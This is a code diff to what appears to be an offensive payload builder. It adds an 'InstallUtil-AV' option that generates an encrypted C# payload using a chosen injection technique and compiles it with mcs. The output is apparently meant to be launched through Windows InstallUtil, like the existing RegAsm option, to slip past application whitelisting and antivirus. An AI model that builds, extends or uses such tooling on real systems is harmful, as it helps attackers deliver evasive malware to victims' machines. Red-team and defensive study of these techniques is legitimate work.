@@ -29,6 +29,18 @@ def main():
                 if(compile):
                     print(Fore.GREEN + Style.BRIGHT + "[*] Payload dll/exe Generated:", f"{output_path}/{binary}")
 
+            case "InstallUtil-AV":
+                print()
+                print(Fore.CYAN + Style.BRIGHT + f"[*] Generating Payload for {binary.upper()}!")
+
+                generate_cs_file(binary, encrypted, injection_technique)
+                print(Fore.GREEN + Style.BRIGHT + "[*] C# File Generated:", f"{output_path}/{binary}.cs")
+
+                compile = mcs_compile(f"mcs -r:System.Configuration.Install.dll -target:exe -platform:{args.arch} {output_path}/{binary}.cs")
+                if(compile):
+                    print(Fore.GREEN + Style.BRIGHT + "[*] Payload dll/exe Generated:", f"{output_path}/{binary}")
+
+
             case "RegAsm":
                 print()
                 print(Fore.CYAN + Style.BRIGHT + f"[*] Generating Payload for {binary.upper()}!")
